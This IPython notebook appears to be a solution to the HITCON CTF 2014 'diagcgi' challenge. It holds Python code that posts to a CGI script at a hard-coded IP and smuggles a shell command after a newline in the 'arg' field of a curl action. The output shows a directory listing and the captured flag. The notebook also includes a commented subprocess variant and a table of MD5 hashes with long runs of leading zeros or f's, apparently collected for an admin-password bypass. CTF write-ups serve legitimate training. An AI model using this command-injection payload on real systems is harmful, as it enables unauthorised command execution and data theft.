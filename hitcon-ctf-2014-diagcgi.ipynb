{
 "metadata": {
  "name": "",
  "signature": "sha256:8e1531357c24475ab5ce6485148db70b395a0b8ef02603f1d448b8516d65d24b"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "headers = dict()\n",
      "headers = {'User-Agent': 'Mozilla/5.0'}\n",
      "cookies = {\"diagsess\":\"../etc/passwd\"} # doesn't matter\n",
      "cmd =\" ls /\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "bin\n",
        "boot\n",
        "dev\n",
        "etc\n",
        "home\n",
        "initrd.img\n",
        "key.txt\n",
        "lib\n",
        "lib64\n",
        "lost+found\n",
        "media\n",
        "mnt\n",
        "opt\n",
        "proc\n",
        "read_key\n",
        "root\n",
        "run\n",
        "sbin\n",
        "srv\n",
        "sys\n",
        "tmp\n",
        "usr\n",
        "var\n",
        "vmlinuz\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd = \"/read_key /key.txt\"\n",
      "# or use python to read stderr\n",
      "# cmd = \"python -c s=__import__('subprocess');print(s.check_output('/read_key'+chr(32)+'/key.txt',stderr=s.STDOUT,shell=True))\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "HITCON{a755be06b165ed8fc4710d3544fce942}\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# BTW, attempts to find an admin password\n",
      "# from http://calebmadrigal.com/display-list-as-table-in-ipython-notebook/\n",
      "class ListTable(list):\n",
      "    \"\"\" Overridden list class which takes a 2-dimensional list of \n",
      "        the form [[1,2,3],[4,5,6]], and renders an HTML Table in \n",
      "        IPython Notebook. \"\"\"\n",
      "    \n",
      "    def _repr_html_(self):\n",
      "        html = [\"<table>\"]\n",
      "        for row in self:\n",
      "            html.append(\"<tr>\")            \n",
      "            html.extend(\"<td>{0}</td>\".format(col) for col in row)            \n",
      "            html.append(\"</tr>\")\n",
      "        html.append(\"</table>\")\n",
      "        return ''.join(html)\n",
      "    \n",
      "from hashlib import md5\n",
      "L =[  \"djGFYmi\", \"ZkjAFaaaa\", \n",
      "          \"G/I2/vILur4AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA=\".decode(\"base64\"),\n",
      "         \"Vf3ppC4Iu74AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA=\".decode(\"base64\"),\n",
      "        \"6Za/F6+mur4AAAAAaHR0cDovL2hhc2hjYXQubmV0LwA= \".decode(\"base64\"),       \n",
      "         'Kdr.b4v', 'K1UgX15KGWDJKTdo', 'xIoN=JG']\n",
      "L+=[ 'b81.org/kpoz&AV' , 'b81.org/GD9FD&Sa', 'b81.org/S27Mp1Ya']\n",
      "S = sorted( (md5(x).hexdigest(), x) for x in L )\n",
      "ListTable([['Leading 0 or f', 'md5 hexdigest', 'plaintext']]+[[[i for i in range(len(s[0])-1) if s[0][i]!=s[0][i+1]][0]+1, s[0], repr(s[1])] for s in S])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<table><tr><td>Leading 0 or f</td><td>md5 hexdigest</td><td>plaintext</td></tr><tr><td>12</td><td>0000000000006c32a237fc882cc44a4b</td><td>'U\\xfd\\xe9\\xa4.\\x08\\xbb\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr><tr><td>12</td><td>0000000000008d003b0ffcf6b666342e</td><td>'xIoN=JG'</td></tr><tr><td>11</td><td>00000000000277ec3301b3cabacb95c9</td><td>'\\x1b\\xf26\\xfe\\xf2\\x0b\\xba\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr><tr><td>11</td><td>00000000000639f3eb26b63f0a7baca3</td><td>'ZkjAFaaaa'</td></tr><tr><td>11</td><td>00000000000b814f9865b26c0ebb4136</td><td>'Kdr.b4v'</td></tr><tr><td>11</td><td>00000000000ccda838e4b06d6d662dca</td><td>'djGFYmi'</td></tr><tr><td>10</td><td>000000000016deedb58402856305e702</td><td>'b81.org/GD9FD&Sa'</td></tr><tr><td>10</td><td>ffffffffffe538aaef4811a59ec8af0f</td><td>'b81.org/S27Mp1Ya'</td></tr><tr><td>11</td><td>fffffffffff5d05f4b93da2870f43376</td><td>'K1UgX15KGWDJKTdo'</td></tr><tr><td>11</td><td>fffffffffff8821c53918df398cda5d8</td><td>'b81.org/kpoz&AV'</td></tr><tr><td>12</td><td>ffffffffffff4de6f952846ffc0f4d15</td><td>'\\xe9\\x96\\xbf\\x17\\xaf\\xa6\\xba\\xbe\\x00\\x00\\x00\\x00http://hashcat.net/\\x00'</td></tr></table>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 8,
       "text": [
        "[['Leading 0 or f', 'md5 hexdigest', 'plaintext'],\n",
        " [12,\n",
        "  '0000000000006c32a237fc882cc44a4b',\n",
        "  \"'U\\\\xfd\\\\xe9\\\\xa4.\\\\x08\\\\xbb\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"],\n",
        " [12, '0000000000008d003b0ffcf6b666342e', \"'xIoN=JG'\"],\n",
        " [11,\n",
        "  '00000000000277ec3301b3cabacb95c9',\n",
        "  \"'\\\\x1b\\\\xf26\\\\xfe\\\\xf2\\\\x0b\\\\xba\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"],\n",
        " [11, '00000000000639f3eb26b63f0a7baca3', \"'ZkjAFaaaa'\"],\n",
        " [11, '00000000000b814f9865b26c0ebb4136', \"'Kdr.b4v'\"],\n",
        " [11, '00000000000ccda838e4b06d6d662dca', \"'djGFYmi'\"],\n",
        " [10, '000000000016deedb58402856305e702', \"'b81.org/GD9FD&Sa'\"],\n",
        " [10, 'ffffffffffe538aaef4811a59ec8af0f', \"'b81.org/S27Mp1Ya'\"],\n",
        " [11, 'fffffffffff5d05f4b93da2870f43376', \"'K1UgX15KGWDJKTdo'\"],\n",
        " [11, 'fffffffffff8821c53918df398cda5d8', \"'b81.org/kpoz&AV'\"],\n",
        " [12,\n",
        "  'ffffffffffff4de6f952846ffc0f4d15',\n",
        "  \"'\\\\xe9\\\\x96\\\\xbf\\\\x17\\\\xaf\\\\xa6\\\\xba\\\\xbe\\\\x00\\\\x00\\\\x00\\\\x00http://hashcat.net/\\\\x00'\"]]"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}